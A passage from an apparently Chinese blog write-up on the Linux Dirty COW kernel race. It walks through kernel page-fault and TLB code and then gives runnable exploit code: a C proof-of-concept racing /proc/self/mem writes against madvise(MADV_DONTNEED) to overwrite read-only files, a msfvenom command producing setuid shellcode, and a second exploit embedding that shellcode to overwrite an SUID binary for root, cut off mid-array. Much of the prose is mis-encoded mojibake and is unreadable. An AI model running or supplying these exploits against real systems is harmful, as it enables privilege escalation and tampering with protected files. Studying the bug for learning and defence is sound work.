‡è®°ä¸‹é¡µé¢åˆšåˆšè®¿é—®è¿‡</span><br>&#125;<br>            <span class="hljs-comment">//ç§»å‡ºåå‘æ˜ å°„ï¼Œå¹¶å‡å°‘pageçš„å¼•ç”¨è®¡æ•°</span><br>rss[mm_counter(page)]--;<br>page_remove_rmap(page, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (unlikely(page_mapcount(page) &lt; <span class="hljs-number">0</span>))<br>print_bad_pte(vma, addr, ptent, page);<br><span class="hljs-keyword">if</span> (unlikely(__tlb_remove_page(tlb, page))) &#123;<span class="hljs-comment">//TLBä¸­ç§»å‡ºå¯¹åº”é¡µ</span><br>force_flush = <span class="hljs-number">1</span>;<br>pending_page = page;<br>addr += PAGE_SIZE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">continue</span>;<span class="hljs-comment">//å¤„ç†ä¸‹ä¸€ä¸ªé¡µ</span><br>&#125;<br><span class="hljs-comment">/* only check swap_entries if explicitly asked for in details */</span><br><span class="hljs-keyword">if</span> (unlikely(details &amp;&amp; !details-&gt;check_swap_entries))<br><span class="hljs-keyword">continue</span>;<br><br>entry = pte_to_swp_entry(ptent);<br><span class="hljs-keyword">if</span> (!non_swap_entry(entry))<br>rss[MM_SWAPENTS]--;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (is_migration_entry(entry)) &#123;<br><span class="hljs-keyword">struct</span> page *page;<br><br>page = migration_entry_to_page(entry);<br>rss[mm_counter(page)]--;<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(!free_swap_and_cache(entry)))<br>print_bad_pte(vma, addr, ptent, <span class="hljs-literal">NULL</span>);<br>pte_clear_not_present_full(mm, addr, pte, tlb-&gt;fullmm);<br>&#125; <span class="hljs-keyword">while</span> (pte++, addr += PAGE_SIZE, addr != end);<br><br>add_mm_rss_vec(mm, rss);<br>arch_leave_lazy_mmu_mode();<br><br><span class="hljs-comment">/* Do the actual TLB flush before dropping ptl */</span><br><span class="hljs-keyword">if</span> (force_flush)<br>tlb_flush_mmu_tlbonly(tlb);<br>pte_unmap_unlock(start_pte, ptl);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we forced a TLB flush (either due to running out of</span><br><span class="hljs-comment"> * batch buffers or because we needed to flush dirty TLB</span><br><span class="hljs-comment"> * entries before releasing the ptl), free the batched</span><br><span class="hljs-comment"> * memory too. Restart if we didn&#x27;t do everything.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (force_flush) &#123;<br>force_flush = <span class="hljs-number">0</span>;<br>tlb_flush_mmu_free(tlb);<br><span class="hljs-keyword">if</span> (pending_page) &#123;<br><span class="hljs-comment">/* remove the page with new size */</span><br>__tlb_remove_pte_page(tlb, pending_page);<br>pending_page = <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (addr != end)<br><span class="hljs-keyword">goto</span> again;<br>&#125;<br><br><span class="hljs-keyword">return</span> addr;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="0x03ï¼šæ¼æ´åˆ†æ"><a href="#0x03ï¼šæ¼æ´åˆ†æ" class="headerlink" title="0x03ï¼šæ¼æ´åˆ†æ"></a>0x03ï¼šæ¼æ´åˆ†æ</h1><p><del>ç‰›é­”çš„ï¼Œç»ˆäºåˆ°è¿™äº†</del></p><p>è®©æˆ‘ä»¬æ¥å›é¡¾ä¸€ä¸‹æ•´ä¸ªæµç¨‹</p><ul><li>step â… ï¼š<code>__get_user_pages()</code>ç¬¬ä¸€æ¬¡å¾ªç¯ï¼Œ<code>faultin_page()</code>åˆ¤æ–­å±äºå†™å…¥åªè¯»åŒºåŸŸçš„æƒ…å†µ, å› æ­¤ä¼šè°ƒç”¨<code>do_cow_fault()</code>ã€‚<code>do_cow_fault()</code>ä¼šå¤åˆ¶åŸå§‹çš„æ–‡ä»¶ç¼“å­˜é¡µåˆ°ä¸€ä¸ªæ–°é¡µä¸­, å¹¶è®¾ç½®<strong>PTE</strong>æ˜ å°„åˆ°è¿™ä¸ªæ–°é¡µ, ä½†ç”±äº<strong>VMA</strong>ä¸å¯å†™å…¥, å› æ­¤è¿™ä¸ªæ–°é¡µçš„<strong>PTE</strong>é¡µæ²¡æœ‰è®¾ç½®<strong>RW</strong>æ ‡å¿—</li><li>step â…¡ï¼š<code>__get_user_pages()</code>ç¬¬äºŒæ¬¡å¾ªç¯ï¼Œç”±äº<code>foll_flags</code>ä¸­æœ‰<strong>FOLL_WRITE</strong>æ ‡å¿—, ä½†æ˜¯é¡µå¯¹åº”çš„<strong>PTE</strong>æ²¡æœ‰<strong>RW</strong>æ ‡å¿—, å› æ­¤<code>follow_page_mask()</code>åˆ¤æ–­æƒé™æœ‰é—®é¢˜,ã€‚å†æ¬¡è¿›å…¥<code>faultin_page()</code>ï¼Œ<code>faultin_page()</code>åˆ¤æ–­, å±äºå†™å…¥åªè¯»çš„å·²å­˜åœ¨çš„é¡µé€ æˆçš„é—®é¢˜, å› æ­¤ä¼šè°ƒç”¨<code>do_wp_page()</code>å¤„ç†ã€‚<code>do_wp_page()</code>å‘ç°å¯¹åº”é¡µæ˜¯åªæœ‰ä¸€ä¸ªå¼•ç”¨çš„åŒ¿åé¡µ,å› æ­¤ä¼šè°ƒç”¨<code>wp_page_reuse()</code>ç›´æ¥é‡ç”¨è¿™ä¸ªé¡µã€‚<code>wp_page_reuse()</code>ç”±äºå¯¹åº”<strong>VMA</strong>åªè¯», å› æ­¤åªä¼šç»™<strong>PTE</strong>è®¾ç½®ä¸€ä¸ª<strong>Dirty</strong>æ ‡å¿—, è€Œä¸ä¼šè®¾ç½®<strong>RW</strong>æ ‡å¿—, ç„¶åè¿”å›ä¸€ä¸ª<strong>VM_FAULT_WRITE</strong>è¡¨ç¤ºå†…æ ¸å¯ä»¥å†™å…¥è¿™ä¸ªé¡µã€‚è¿”å›åˆ°<code>faultin_page()</code>ä¸­, ç”±äº<code>handle_mm_fault()</code>è¿”å›äº†<strong>VM_FAULT_WRITE</strong>, å› æ­¤ä¼šå»æ‰<strong>FOLL_WRITE</strong>æ ‡å¿—, å«ä¹‰ä¸º: è™½ç„¶æ­¤é¡µå¯¹åº”<strong>PTE</strong>ä¸å¯å†™å…¥, ä½†æ˜¯å·²ç»<strong>COW</strong>è¿‡äº†, å†…æ ¸æ˜¯å¯ä»¥å†™å…¥çš„, åç»­<code>follow_page_mask()</code>å°±ä¸è¦æ£€æŸ¥èƒ½ä¸èƒ½å†™å…¥äº†ã€‚</li></ul><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬è°ƒç”¨<code>madvise</code>ï¼Œå¹¶å»ºè®®å†…æ ¸æ‰§è¡Œå…¶ä¸­<strong>DONTNEED</strong>çš„<code>behavior</code>ï¼Œå†…æ ¸æ¸…ç©ºæ­¤<strong>PTE</strong>ä¼šå‘ç”Ÿä»€ä¹ˆæï¼Ÿï¼ŸğŸ¤”</p><p>é¦–å…ˆ<code>follow_page_mask()</code>ä¼šå› ä¸ºå¯¹åº”PTEä¸ºNULLè€Œå†æ¬¡å¤±è´¥, è¿›å…¥<code>faultin_page()</code>ï¼Œ ä½†æ˜¯æ³¨æ„, è¿™æ¬¡è¿›å…¥çš„æ—¶å€™æ²¡æœ‰<strong>FOLL_WRITE</strong>æ ‡å¿—ã€‚<code>faultin_page()</code>å› æ­¤è®¾ç½®<code>fault_flags</code>æ—¶æ˜¯æ²¡æœ‰<strong>FAULT_FALG_WRITE</strong>æ ‡å¿—çš„, ä¹Ÿå°±æ˜¯è¯´<code>faultin_page()</code>å¯¹<code>handle_mm_fault()</code>æ‰¿è¯ºä¸ä¼šå†™å…¥è¿™ä¸ªé¡µã€‚<code>handle_mm_fault()</code>ç”±äº<strong>PTE</strong>ä¸º<strong>NONE</strong>, å¹¶ä¸”ä¸è¦æ±‚å†™å…¥, å› æ­¤æœ€ç»ˆä¼šåˆ†æ´¾ç»™<code>do_read_fault()</code>å¤„ç†</p><h3 id="do-read-fault"><a href="#do-read-fault" class="headerlink" title="do_read_fault()"></a>do_read_fault()</h3><p><code>do_read_fault()</code>ä¼šæŸ¥æ‰¾è¿™ç‰‡<strong>VMA</strong>æ˜ å°„çš„åœ°å€ç©ºé—´ä¸­, <code>address</code>å¯¹åº”çš„åŸå§‹ç¼“å­˜é¡µ, ç„¶åè¿”å›è¿™ä¸ªåŸå§‹ç¼“å­˜é¡µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_read_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pgoff_t</span> pgoff)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>;</span><br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Let&#x27;s call -&gt;map_pages() first and use -&gt;fault() as fallback</span><br><span class="hljs-comment"> * if page by the offset is not ready to be mapped (cold cache or</span><br><span class="hljs-comment"> * something).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (vma-&gt;vm_ops-&gt;map_pages &amp;&amp; fault_around_bytes &gt;&gt; PAGE_SHIFT &gt; <span class="hljs-number">1</span>) &#123;<br>ret = do_fault_around(fe, pgoff);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br>ret = __do_fault(fe, pgoff, <span class="hljs-literal">NULL</span>, &amp;fault_page, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br><span class="hljs-keyword">return</span> ret;<br><br>ret |= alloc_set_pte(fe, <span class="hljs-literal">NULL</span>, fault_page);<br><span class="hljs-keyword">if</span> (fe-&gt;pte)<br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>unlock_page(fault_page);<br><span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>put_page(fault_page);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è™½ç„¶æ‰§è¡Œçš„æ—¶deo_read_faultï¼Œä½†æ­¤æ—¶çš„write flagå¯æ˜¯trueï¼Œäºæ˜¯åœ¨__access_remote_vmä¸­ä¼šè°ƒç”¨copy_to_user_page()æŠŠç”¨æˆ·ç©ºé—´çš„æ•°æ®å†™å…¥å›ºå®šçš„é¡µï¼Œç”±æ­¤æ±¡æŸ“äº†æ–‡ä»¶çš„åŸå§‹ç¼“å­˜é¡µã€‚</p><p>ä¸€æ®µæ—¶é—´åï¼Œå½“è¿›è¡Œç£ç›˜åŒæ­¥æ—¶å†…æ ¸ä¼šæŠŠè¢«æ±¡æŸ“çš„é¡µé¢å›å†™åˆ°ç£ç›˜ä¸­,ä¿®æ”¹åªè¯»æ–‡ä»¶çš„å†…å®¹ã€‚</p><p>ç”±æ­¤ï¼Œåˆ©ç”¨å®Œæˆã€‚</p><h3 id="å¿…è¦ãªå•é¡Œ"><a href="#å¿…è¦ãªå•é¡Œ" class="headerlink" title="å¿…è¦ãªå•é¡Œ"></a>å¿…è¦ãªå•é¡Œ</h3><p>ä¸éš¾æƒ³åˆ°ï¼Œå¼€å¯ä¸¤ä¸ªçº¿ç¨‹ä¾¿èƒ½åœ¨ç¬¬äºŒæ¬¡<code>__get_user_pages</code>ä¹‹åï¼Œç¬¬ä¸‰æ¬¡<code>__get_user_pages</code>ä¹‹å‰å®Œæˆmadvise</p><p>ä½†æ˜¯æ—¶é—´çª—å£å¾ˆé‡è¦ï¼Œè¿™æ„å‘³ç€æ­¤åˆ©ç”¨çš„æˆåŠŸç‡ä»¥åŠå®ç”¨ä»·å€¼</p><p>å¹¸è¿çš„æ˜¯åœ¨æ¯æ¬¡å¾ªç¯çš„å¼€å¤´ï¼Œéƒ½ä¼šè°ƒç”¨cond_resched()åˆ‡æ¢åˆ°åˆ«çš„ä»»åŠ¡ï¼Œè¿™ä¸ªæ—¶é—´é—´éš”å®Œå…¨å¯ä»¥æ»¡è¶³</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br><span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br>cond_resched();<span class="hljs-comment">//è°ƒåº¦æ‰§è¡Œåˆ«çš„ä»»åŠ¡</span><br></code></pre></td></tr></table></figure><h1 id="0x04ï¼šåˆ©ç”¨-expç¼–å†™"><a href="#0x04ï¼šåˆ©ç”¨-expç¼–å†™" class="headerlink" title="0x04ï¼šåˆ©ç”¨ &amp; expç¼–å†™"></a>0x04ï¼šåˆ©ç”¨ &amp; expç¼–å†™</h1><h2 id="å…ˆæ¥å†™ä¸€ä¸ªéªŒè¯poc"><a href="#å…ˆæ¥å†™ä¸€ä¸ªéªŒè¯poc" class="headerlink" title="å…ˆæ¥å†™ä¸€ä¸ªéªŒè¯poc"></a>å…ˆæ¥å†™ä¸€ä¸ªéªŒè¯poc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>, <span class="hljs-title">fake_st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><span class="hljs-type">int</span> mem_fd, dest_fd, fake_fd;<br><span class="hljs-type">char</span> *fake_data;<br><span class="hljs-type">pthread_t</span> mem_pthread, madvise_pthread;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br>                                 <br><span class="hljs-type">void</span> * <span class="hljs-title function_">mem_func</span><span class="hljs-params">()</span><br>&#123;<br>    mem_fd = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        lseek(mem_fd, (<span class="hljs-type">off_t</span>) mem, SEEK_SET);<br>        write(mem_fd, fake_data, <span class="hljs-number">0x1000</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">madvise_func</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>        err_exit(<span class="hljs-string">&quot;pls usage ./exp destination_file fake_file&quot;</span>);<br>    <br><span class="hljs-comment">//open &amp; read fake file</span><br>    fake_fd = open(argv[<span class="hljs-number">2</span>], O_RDONLY);<br>    fstat(fake_fd, &amp;fake_st);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake_fd is %d\n&quot;</span>, fake_fd);<br>    fake_data = <span class="hljs-built_in">malloc</span>(fake_st.st_size);<br>    read(fake_fd, fake_data, fake_st.st_size);<br><br><span class="hljs-comment">//open dest file   </span><br>    dest_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dest_fd is %d\n&quot;</span>, dest_fd);<br>    fstat(dest_fd, &amp;dest_st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, dest_st.st_size, PROT_READ, MAP_PRIVATE, dest_fd, <span class="hljs-number">0</span>);<br><br>    pthread_create(&amp;mem_pthread, <span class="hljs-literal">NULL</span>, mem_func, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;madvise_pthread, <span class="hljs-literal">NULL</span>, madvise_func, <span class="hljs-literal">NULL</span>);<br><br>    pthread_join(mem_pthread, <span class="hljs-literal">NULL</span>);<br>    pthread_join(madvise_pthread, <span class="hljs-literal">NULL</span>);<br>    <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¯¹äºæ™®é€šç”¨æˆ·åªæœ‰åªè¯»æƒé™çš„æ–‡ä»¶ï¼Œå·²ç»å¯ä»¥è¦†å†™äº†</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±èƒ½è¿›è¡Œä¸€äº›<del>å˜¿å˜¿å˜¿ğŸ¥µğŸ¥µğŸ¥µ</del>çš„äº‹æƒ…äº†</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306105004.png"></p><h2 id="åˆ©ç”¨suidè¿›è¡Œææƒ"><a href="#åˆ©ç”¨suidè¿›è¡Œææƒ" class="headerlink" title="åˆ©ç”¨suidè¿›è¡Œææƒ"></a>åˆ©ç”¨suidè¿›è¡Œææƒ</h2><p>è¿™ä¸ªæ‰‹æ³•åœ¨æ¸—é€ä¸­ä¹Ÿæ˜¯å¾ˆå¸¸è§äº†ï¼Œåœ¨æ­¤å°±ä¸å†èµ˜è¿°äº†</p><p>åŸºæœ¬ä¸Šå°±æ˜¯åˆ©ç”¨dirtycowæŠŠå…·æœ‰suidçš„æ–‡ä»¶ç»™è¶Šæƒç¯¡æ”¹ï¼Œå†™è¿›ææƒçš„shellcodeï¼Œå†æ‰§è¡Œå°±å¥½äº†</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p><code>msf</code>ç”Ÿæˆ<code>shellcode</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p linux/x64/exec PrependSetuid=True -f elf | xxd -i<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><span class="hljs-type">int</span> data_len = <span class="hljs-number">149</span>;<br><span class="hljs-type">pthread_t</span> mem_pthread, madvise_pthread;<br><span class="hljs-type">int</span> dest_fd, fake_fd, mem_fd;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> attack_data[] = &#123;<br>  <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x95</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span 